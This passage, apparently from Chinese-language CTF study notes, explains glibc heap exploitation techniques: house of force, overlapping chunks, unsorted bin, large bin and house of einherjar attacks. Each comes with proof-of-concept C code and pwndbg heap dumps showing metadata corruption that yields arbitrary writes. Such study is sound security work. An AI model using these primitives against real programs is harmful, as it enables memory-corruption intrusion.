*victim_chunk &#x3D; victim-2;      stack_buffer_1[0] &#x3D; 0;  stack_buffer_1[1] &#x3D; 0;  stack_buffer_1[2] &#x3D; victim_chunk;  stack_buffer_1[3] &#x3D; (intptr_t*)stack_buffer_2;  stack_buffer_2[2] &#x3D; (intptr_t*)stack_buffer_1;  void *p5 &#x3D; malloc(1000);   free((void*)victim);  void *p2 &#x3D; malloc(1200);  victim[1] &#x3D; (intptr_t)stack_buffer_1;  void *p3 &#x3D; malloc(0x100);  char *p4 &#x3D; malloc(0x100);      intptr_t sc &#x3D; (intptr_t)jackpot;   memcpy((p4+40), &amp;sc, 8);  assert((long)__builtin_return_address(0) &#x3D;&#x3D; (long)jackpot);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个<code>small bin</code>之后在栈上伪造以该堆为起点的链，包含两个<code>fake chunk</code>,伪造过程即修改三个堆的<code>fd</code>和<code>bk</code>区域的位置，这样就可以绕过<code>small bin</code> 对<code>fd</code>以及需要申请的<code>fake chunk</code>不能在<code>small bin</code>链的尾部的检查，申请相同大小的堆即可将<code>fake chunk</code>申请出来。</p><p>相关<code>glibc</code>源码：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)        &#123;          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;            malloc_consolidate (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">else           &#123;             bck &#x3D; victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))               &#123;                 errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;                 goto errout;               &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从<code>small bin</code> 申请堆的时候会判断最后一个堆的<code>bk</code>指向的堆的<code>fd</code>是否是该堆，因此在需要申请的位置后面还要再伪造一个堆</p><p>创建两个堆（第二个防止合并），并且在栈上伪造一个链表</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x55555555b110Size: 0x3f1Top chunk | PREV_INUSEAddr: 0x55555555b500Size: 0x20b01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd600x7fffffffdd60:0x00000000000000000x00000000000000000x7fffffffdd70:0x000055555555b0000x00007fffffffdd40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x00007fffffffdd400x7fffffffdd40:0x00000000000000000x00000000000000000x7fffffffdd50:0x00007fffffffdd60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>释放第一个堆并且再次创建一个堆使其进入<code>small bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapFree chunk (smallbins) | PREV_INUSEAddr: 0x55555555b000Size: 0x111fd: 0x7ffff7dd1c78bk: 0x7ffff7dd1c78Allocated chunkAddr: 0x55555555b110Size: 0x3f0Allocated chunk | PREV_INUSEAddr: 0x55555555b500Size: 0x4c1Top chunk | PREV_INUSEAddr: 0x55555555b9c0Size: 0x20641<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改堆的<code>bk</code>为栈上伪造的堆的地址，第二次申请即可得到栈上的地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapFree chunk (smallbins) | PREV_INUSEAddr: 0x55555555b000Size: 0x111fd: 0x7ffff7dd1c78bk: 0x7fffffffdd60Allocated chunk | PREV_INUSEAddr: 0x55555555b110Size: 0x3f1Allocated chunk | PREV_INUSEAddr: 0x55555555b500Size: 0x4c1Top chunk | PREV_INUSEAddr: 0x55555555b9c0Size: 0x20641<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;int main(int argc , char* argv[])&#123;intptr_t *p1,*p2,*p3,*p4;p1 &#x3D; malloc(0x100 - 8);p2 &#x3D; malloc(0x100 - 8);p3 &#x3D; malloc(0x80 - 8);memset(p1, &#39;1&#39;, 0x100 - 8);memset(p2, &#39;2&#39;, 0x100 - 8);memset(p3, &#39;3&#39;, 0x80 - 8);    free(p2);int evil_chunk_size &#x3D; 0x181;int evil_region_size &#x3D; 0x180 - 8;*(p2-1) &#x3D; evil_chunk_size;     p4 &#x3D; malloc(evil_region_size);    memset(p4, &#39;4&#39;, evil_region_size);memset(p3, &#39;3&#39;, 80);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建两个实际大小为<code>0x101</code>的堆和一个<code>0x81</code>的堆，释放第二个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x101Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555b100Size: 0x101fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555b200Size: 0x80Top chunk | PREV_INUSEAddr: 0x55555555b280Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将被释放的堆的大小改成第二、三个堆的大小之和， 此时第二个堆覆盖了第三个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x101Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555b100Size: 0x181fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Top chunk | PREV_INUSEAddr: 0x55555555b280Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再将该堆申请出来即可实现<code>overlap</code>,即申请的堆包含了初始的第三个堆且可向其写入数据</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x101Allocated chunk | PREV_INUSEAddr: 0x55555555b100Size: 0x181Top chunk | PREV_INUSEAddr: 0x55555555b280Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现效果：存在两个堆，使得上一个堆覆盖到下一个堆</p><h3 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123;    intptr_t *p1,*p2,*p3,*p4,*p5,*p6;  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;  int prev_in_use &#x3D; 0x1;  p1 &#x3D; malloc(1000);  p2 &#x3D; malloc(1000);  p3 &#x3D; malloc(1000);  p4 &#x3D; malloc(1000);  p5 &#x3D; malloc(1000);  real_size_p1 &#x3D; malloc_usable_size(p1);  real_size_p2 &#x3D; malloc_usable_size(p2);  real_size_p3 &#x3D; malloc_usable_size(p3);  real_size_p4 &#x3D; malloc_usable_size(p4);  real_size_p5 &#x3D; malloc_usable_size(p5);  memset(p1,&#39;A&#39;,real_size_p1);  memset(p2,&#39;B&#39;,real_size_p2);  memset(p3,&#39;C&#39;,real_size_p3);  memset(p4,&#39;D&#39;,real_size_p4);  memset(p5,&#39;E&#39;,real_size_p5);  free(p4);  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) &#x3D; real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2;  free(p2);  p6 &#x3D; malloc(2000);  real_size_p6 &#x3D; malloc_usable_size(p6);  memset(p6,&#39;F&#39;,1500);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先创建5个堆，释放第四个堆，将第二个堆的大小改成二三两个堆大小之和，此时第二个堆覆盖了第三个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x3f1Allocated chunk | PREV_INUSEAddr: 0x55555555b3f0Size: 0x7e1Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555bbd0Size: 0x3f1fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555bfc0Size: 0x3f0Top chunk | PREV_INUSEAddr: 0x55555555c3b0Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放被合并的堆并申请回来，此时第二、三、四个堆会被合并成一个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x3f1Allocated chunk | PREV_INUSEAddr: 0x55555555b3f0Size: 0x7e1Free chunk (unsortedbin) | PREV_INUSEAddr: 0x55555555bbd0Size: 0x3f1fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x55555555bfc0Size: 0x3f0Top chunk | PREV_INUSEAddr: 0x55555555c3b0Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第三个堆始终没有被操作，而新创建的堆可以堆第三个堆进行读写，形成<code>overlap</code></p><p>相关<code>glibc</code>源码：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* consolidate forward *&#x2F;      if (!nextinuse) &#123;unlink(av, nextchunk, bck, fwd);size +&#x3D; nextsize;      &#125; elseclear_inuse_bit_at_offset(nextchunk, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放被合并的堆的时候会判断下一个堆即第四个堆是被释放的，因此向下合并到第四个堆</p><p>实现效果：存在三个堆，将三个堆合并成一个堆，且可以覆写中间一个堆、中间一个堆始终未被操作</p><p>应用：2.31之前的<code>off-by-null</code>：创建三个堆<code>A、B、C</code>通过<code>off-by-bull</code>溢出<code>B</code>到<code>C</code>使得<code>C</code>的低字节被覆盖为<code>0</code>（注意：被覆盖的堆原始大小要在<code>fx</code>，这样创建的堆实际大小就是<code>10x</code>而不会因为修改了第二位导致错误，且<code>A</code>的大小属于<code>unsorted bin</code>）将<code>C</code>的<code>prve_size</code>改成<code>A</code>和<code>B</code>的大小之和，系统将判断<code>A</code>和<code>B</code>是一个堆并且已经被释放，此时释放<code>A</code>和<code>C</code>，从<code>A</code>到<code>C</code>的区域就会合并成一个堆并释放，而<code>B</code>仍然存在。</p><h3 id="house-of-force-x2F-top-chunk"><a href="#house-of-force-x2F-top-chunk" class="headerlink" title="house_of_force&#x2F;top chunk"></a>house_of_force&#x2F;top chunk</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;char bss_var[] &#x3D; &quot;This is a string that we want to overwrite.&quot;;int main(int argc , char* argv[])&#123;    intptr_t *p1 &#x3D; malloc(256);int real_size &#x3D; malloc_usable_size(p1);    intptr_t *ptr_top &#x3D; (intptr_t *) ((char *)p1 + real_size - sizeof(long));*(intptr_t *)((char *)ptr_top + sizeof(long)) &#x3D; -1;unsigned long evil_size &#x3D; (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;void *new_ptr &#x3D; malloc(evil_size);void* ctr_chunk &#x3D; malloc(100);strcpy(ctr_chunk, &quot;YEAH!!!&quot;);    assert(ctr_chunk &#x3D;&#x3D; bss_var);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>条件：可以溢出到top_chunk、可以申请任意大小的堆块</p><p>首先创建了一个堆，并溢出到<code>top chunk</code>将<code>size</code>改成<code>-1</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555c000Size: 0x111Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0x55555555c110Size: 0xffffffffffffffff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>计算要覆写的地址和<code>top chunk</code>的差并减去<code>chunk header</code>的大小，申请该大小的堆，即把所需地址之前的空间都申请完，因此下一个申请的堆<code>user data</code>处即为要覆写的区域</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk#申请完所求地址之前的所有空间Addr: 0x555555558000Size: 0x555555558008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    unsigned long stack_var&#x3D;0;    unsigned long *p&#x3D;malloc(400);malloc(500);free(p);    p[1]&#x3D;(unsigned long)(&amp;stack_var-2);    malloc(400);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前提：控制unsorted bin的bk指针</p><p>目的：实现修改任意地址值为一个较大的数值，但是数值不受控制</p><ul><li>通过修改循环的次数来使得程序可以执行多次循环</li><li>修改global_max_fast 来使得更大的 chunk 可以被视为 fast bin，执行 fast bin attack</li></ul><p>原理：将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;          unsorted_chunks (av)-&gt;bk &#x3D; bck;          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>控制 bk 的值就能将 <code>unsorted_chunks (av)</code> 写到任意地址（要减两个机器字长作为<code>prev_size</code>和<code>size</code>，此时<code>Target Value</code> 处于伪造 <code>chunk</code> 的<code>fd</code>处）</p><p><code>victim</code> 的<code>fd</code>在取<code>chunk</code>时并没有发挥作用，所以修改为不合法的值也没有关系，但是<code>unsorted bin </code>链表可能就此破坏，在插入 <code>chunk</code> 时，可能会出现问题</p><p>实现：将<code>unsorted bin</code>中的<code>chunk</code>通过溢出修改<code>bk</code>为要修的地址 - 两个机器字节，再分配掉即可将地址内容改成很大的数值</p><h3 id="house-of-einherjar-off-by-null"><a href="#house-of-einherjar-off-by-null" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123;setbuf(stdin, NULL);setbuf(stdout, NULL);uint8_t* a;uint8_t* b;uint8_t* d;a &#x3D; (uint8_t*) malloc(0x38);    int real_a_size &#x3D; malloc_usable_size(a);size_t fake_chunk[6];fake_chunk[0] &#x3D; 0x100; fake_chunk[1] &#x3D; 0x100; fake_chunk[2] &#x3D; (size_t) fake_chunk; fake_chunk[3] &#x3D; (size_t) fake_chunk; fake_chunk[4] &#x3D; (size_t) fake_chunk; fake_chunk[5] &#x3D; (size_t) fake_chunk; b &#x3D; (uint8_t*) malloc(0xf8);int real_b_size &#x3D; malloc_usable_size(b);uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);    a[real_a_size] &#x3D; 0;     size_t fake_size &#x3D; (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);  *(size_t*)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;fake_chunk[1] &#x3D; fake_size;free(b);    d &#x3D; malloc(0x200);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先创建了一个<code>0x30</code>的堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x41Top chunk | PREV_INUSEAddr: 0x55555555b040Size: 0x20fc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在栈上伪造了一个<code>fake chunk</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffe1c00x7fffffffe1c0: 0x0000000000000100      0x0000000000000100#prev_size, size0x7fffffffe1d0: 0x00007fffffffe1c0      0x00007fffffffe1c0  #fd, bk0x7fffffffe1e0: 0x00007fffffffe1c0      0x00007fffffffe1c0#fd_nextsize, bk_nextsize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个<code>0xf8</code>大小的堆，并通过上一个堆的溢出来将这个堆<code>prve_inuse</code>位改成<code>0</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55555555b000Size: 0x41Allocated chunkAddr: 0x55555555b040Size: 0x100Top chunk | PREV_INUSEAddr: 0x55555555b140Size: 0x20ec1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再将<code>prve_size</code>改成该堆与<code>fake chunk</code>的<code>chunk header</code>地址的差</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x55555555b0400x55555555b040: 0xffffd5555555ce80      0x0000000000000100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>释放该堆再申请回来，此时申请的堆就在<code>fake_chunk</code>处</p><pre class="line-numbers language-none"><code class="language-none">Allocated chunkAddr: 0x7ffffffde010Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在释放一个属于<code>unsorted bin</code>的堆时会检测上一个堆是否被释放，若被释放则向上合并，且下一个堆是<code>top chunk</code>时直接合并到<code>top chunk</code>,所以<code>top chunk</code>地址就在<code>fake chunk</code>处，再次申请堆就可以从<code>fake chunk</code>开始申请</p><p>条件：</p><ul><li>可以篡改<code>prev_size</code> 与 <code>prve_inuse</code> </li><li>能够获取到要覆写的地址</li><li>能够在要覆写的地址伪造<code>fake chunk</code>，从而绕过 <code>unlink </code>的检测。</li></ul><h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;assert.h&gt; int main()&#123;    unsigned long stack_var1 &#x3D; 0;    unsigned long stack_var2 &#x3D; 0;    unsigned long *p1 &#x3D; malloc(0x420);    malloc(0x20);        unsigned long *p2 &#x3D; malloc(0x500);    malloc(0x20);    unsigned long *p3 &#x3D; malloc(0x500);    malloc(0x20);     free(p1);    free(p2);        malloc(0x90);    free(p3);    p2[-1] &#x3D; 0x3f1;    p2[0] &#x3D; 0;    p2[2] &#x3D; 0;    p2[1] &#x3D; (unsigned long)(&amp;stack_var1 - 2);    p2[3] &#x3D; (unsigned long)(&amp;stack_var2 - 4);    malloc(0x90);     assert(stack_var1 !&#x3D; 0);    assert(stack_var2 !&#x3D; 0);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>向栈中写入数据，可用于修改<code>global_max_fast</code></li></ul><p>创建一个<code>large bin</code>之后再创建一个<code>fast bin</code>防止释放的时候合并掉</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x431Allocated chunk | PREV_INUSEAddr: 0x405430Size: 0x31Top chunk | PREV_INUSEAddr: 0x405460Size: 0x20ba1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建两个大小相同且与大于第一个大小的<code>large bin</code>且每个<code>large bin</code>下面都创建一个<code>fast bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x431Allocated chunk | PREV_INUSEAddr: 0x405430Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x405460Size: 0x511Allocated chunk | PREV_INUSEAddr: 0x405970Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x4059a0Size: 0x511Allocated chunk | PREV_INUSEAddr: 0x405eb0Size: 0x31Top chunk | PREV_INUSEAddr: 0x405ee0Size: 0x20121<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将第一、二两个堆释放进<code>unsorted bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x405460 —▸ 0x405000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个比第一个释放的堆小的堆使得<strong>第二个</strong>被释放的堆进入<code>large bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4050a0smallbinsemptylargebins0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将第三个堆也释放到<code>unsorted bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4059a0 —▸ 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4059a0smallbinsemptylargebins0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改第二个被释放的堆的一些内容</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x4054600x405460:0x00000000000000000x00000000000003f1#减小第二个堆的大小使得第三个堆进入large bin链表0x405470:0x00000000000000000x00007fffffffdd50#将想要写入的栈地址写入bk、bk_nextsize,其中bk位置的地址要减0x10，bk_nextsize的地址要减0x200x405480:0x00000000000000000x00007fffffffdd48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个<code>fast bin</code>使得第三个堆进入<code>unsorted bin</code>，此时栈上的内容也会被修改为第三个堆的头指针</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x405140 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405140 &#x2F;* &#39;@Q@&#39; *&#x2F;smallbinsemptylargebins0x500 [corrupted]FD: 0x405460 ◂— 0x0BK: 0x405460 —▸ 0x4059a0 —▸ 0x7fffffffdd50 ◂— 0x4059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;gx 0x7fffffffdd600x7fffffffdd60:0x00000000004059a0pwndbg&gt; x&#x2F;gx 0x7fffffffdd680x7fffffffdd68:0x00000000004059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="house-of-storm-x2F-unsorted-bin-attack-large-bin-attack"><a href="#house-of-storm-x2F-unsorted-bin-attack-large-bin-attack" class="headerlink" title="house_of_storm&#x2F;unsorted bin attack + large bin attack"></a>house_of_storm&#x2F;unsorted bin attack + large bin attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char filler[0x10];char target[0x60]; void init()&#123;        setvbuf(stdout, NULL, _IONBF, 0);        setvbuf(stdin, NULL, _IONBF, 0);&#125;int get_shift_amount(char* pointer)&#123;        int shift_amount &#x3D; 0;        long long ptr &#x3D; (long long)pointer;        while(ptr &gt; 0x20)&#123;                ptr &#x3D; ptr &gt;&gt; 8;                shift_amount +&#x3D; 1;        &#125;        return shift_amount - 1; &#125;int main()&#123;init();char *unsorted_bin, *large_bin, *fake_chunk, *ptr;unsorted_bin &#x3D; malloc ( 0x4e8 ); malloc ( 0x18 ); int shift_amount &#x3D; get_shift_amount(unsorted_bin);        printf(&quot;Shift Amount: %d\n&quot;, shift_amount);        size_t alloc_size &#x3D; ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);        if(alloc_size &lt; 0x10)&#123;                printf(&quot;Chunk Size: 0x%lx\n&quot;, alloc_size);                puts(&quot;Chunk size is too small&quot;);                exit(1);        &#125;        alloc_size &#x3D; (alloc_size &amp; 0xFFFFFFFFE) - 0x10;         printf(&quot;In this case, the chunk size is 0x%lx\n&quot;, alloc_size);        if((alloc_size &amp; 0x8) !&#x3D; 0 || (((alloc_size &amp; 0x4) &#x3D;&#x3D; 0x4) &amp;&amp; ((alloc_size &amp; 0x2) !&#x3D; 0x2)))&#123;                puts(&quot;Allocation size has bit 4 of the size set or &quot;);                puts(&quot;mmap and non-main arena bit check will fail&quot;);                puts(&quot;Please try again! :)&quot;);                